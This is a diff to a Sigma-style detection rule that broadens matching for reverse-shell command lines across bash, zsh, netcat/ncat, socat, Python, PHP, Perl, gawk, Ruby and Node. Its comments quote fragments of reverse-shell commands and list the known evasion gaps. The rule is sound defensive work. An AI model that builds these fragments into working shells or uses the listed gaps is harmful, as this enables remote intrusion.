@@ -3,10 +3,14 @@ id: d1a2b3c4-0042-4000-a000-000000000042
 status: stable
 description: >
     Detects command-line patterns associated with reverse shell creation across
-    representations that trivially evade a single literal: bash/sh /dev/tcp and
-    /dev/udp pseudo-device redirects (any spacing or FD form), netcat -e/-c,
-    the mkfifo+nc named-pipe form, socket/subprocess Python shells regardless of
-    import order, pty.spawn shell upgrades, and PHP fsockopen.
+    representations that trivially evade a single literal: bash/zsh /dev/tcp and
+    /dev/udp pseudo-device redirects (any spacing, FD, or variable-split form),
+    zsh ztcp, netcat/ncat -e/-c (including flags before the exec option), the
+    mkfifo+nc named-pipe form, socket/subprocess Python shells regardless of
+    import order, pty.spawn shell upgrades, PHP fsockopen, perl Socket, socat
+    EXEC, gawk /inet/tcp, ruby TCPSocket, and node child_process. Known gap
+    (behavioral-layer territory, not command-line-visible): base64-encoded
+    payloads piped to a shell, and payloads delivered via a script file.
 author: MacCrab Community
 date: 2026/03/31
 modified: 2026/07/24
@@ -28,10 +32,14 @@ detection:
     #   bash -i  >& /dev/tcp/...    (double space)
     #   sh -i >& /dev/tcp/...       (bare sh)
     #   exec 5<>/dev/tcp/...        (FD redirect form)
+    # No trailing slash: also catches shell variable-indirection splits such as
+    # `D=/dev/tcp;bash -i >& $D/host/port` where `/dev/tcp/` never appears
+    # contiguously. `/dev/tcp` / `/dev/udp` name no real on-disk path, so a bare
+    # match carries no benign cost.
     selection_devnet:
         CommandLine|contains:
-            - '/dev/tcp/'
-            - '/dev/udp/'
+            - '/dev/tcp'
+            - '/dev/udp'
     # Legacy explicit bash literals kept as belt-and-suspenders.
     selection_bash_reverse:
         CommandLine|contains:
@@ -54,14 +62,22 @@ detection:
             - 'nc '
             - 'sh'
     # Python socket reverse shell, import-order independent. Requires the
-    # co-occurring socket + subprocess + connect + /bin/ tokens rather than a
-    # fixed `import socket,subprocess,os` string, so reordered imports still hit.
-    selection_python_socket:
+    # co-occurring socket + subprocess + connect tokens PLUS a SHELL target
+    # (/bin/sh or /bin/bash) — not a bare /bin/ — so a benign CI one-liner such
+    # as `socket.create_connection(...); subprocess.run(['/bin/echo','up'])` does
+    # NOT fire while `subprocess.call(['/bin/sh'])` does.
+    selection_python_socket_sh:
         CommandLine|contains|all:
             - 'socket'
             - 'subprocess'
             - 'connect'
-            - '/bin/'
+            - '/bin/sh'
+    selection_python_socket_bash:
+        CommandLine|contains|all:
+            - 'socket'
+            - 'subprocess'
+            - 'connect'
+            - '/bin/bash'
     # Explicit python one-liners kept for exact-order payloads.
     selection_python_literal:
         CommandLine|contains:
@@ -78,12 +94,69 @@ detection:
             - "pty.spawn('sh'"
             - 'pty.spawn("bash"'
             - "pty.spawn('bash'"
+    # php fsockopen reverse shell. Quote-independent (the sensor strips the outer
+    # quotes of `php -r '...'`): fsockopen + exec + a shell path co-occur.
     selection_php_reverse:
-        CommandLine|contains: "php -r '$sock=fsockopen"
+        CommandLine|contains|all:
+            - 'fsockopen'
+            - 'exec'
+            - '/bin/'
+    # perl Socket reverse shell (pentestmonkey). sockaddr_in is niche enough to
+    # pin the co-occurrence: perl + sockaddr_in + a shell path.
+    selection_perl:
+        CommandLine|contains|all:
+            - 'perl'
+            - 'sockaddr_in'
+            - '/bin/'
+    # socat command-execution over a socket: socat ... EXEC:/bin/sh
+    selection_socat:
+        CommandLine|contains|all:
+            - 'socat'
+            - 'exec:'
+    # gawk network reverse shell using the gawk-specific /inet/tcp/ pseudo-path.
+    selection_awk_inet:
+        CommandLine|contains|all:
+            - 'awk'
+            - '/inet/tcp/'
+            - 'system'
+    # ruby TCPSocket reverse shell. TCPSocket + a shell path is ruby-net specific.
+    selection_ruby:
+        CommandLine|contains|all:
+            - 'ruby'
+            - 'tcpsocket'
+            - '/bin/'
+    # zsh reverse shell via the stock zsh/net/tcp module (zsh is the default macOS
+    # login shell). `ztcp` / `zsh/net/tcp` have no benign command-line use.
+    selection_zsh:
+        CommandLine|contains:
+            - 'ztcp '
+            - 'zsh/net/tcp'
+    # node.js net + child_process reverse shell. Requires the network leg AND a
+    # shell spawn so a benign child_process call does not fire.
+    selection_node:
+        CommandLine|contains|all:
+            - 'child_process'
+            - 'connect'
+            - '/bin/sh'
+    # ncat with flags before -e/-c (e.g. `ncat --ssl host port -e /bin/sh`) breaks
+    # the adjacent literals above; match the tokens in any order. `ncat` + the
+    # exec flag + a shell is reverse-shell-specific.
+    selection_ncat_flags_e:
+        CommandLine|contains|all:
+            - 'ncat'
+            - '-e '
+            - '/bin/'
+    selection_ncat_flags_c:
+        CommandLine|contains|all:
+            - 'ncat'
+            - '-c '
+            - '/bin/'
     condition: >
         selection_devnet or selection_bash_reverse or selection_nc_reverse or
-        selection_mkfifo_nc or selection_python_socket or selection_python_literal or
-        selection_pty_spawn or selection_php_reverse
+        selection_mkfifo_nc or selection_python_socket_sh or selection_python_socket_bash or
+        selection_python_literal or selection_pty_spawn or selection_php_reverse or
+        selection_perl or selection_socat or selection_awk_inet or selection_ruby or
+        selection_zsh or selection_node or selection_ncat_flags_e or selection_ncat_flags_c
 falsepositives:
     - Penetration testing activities
     - CTF challenges
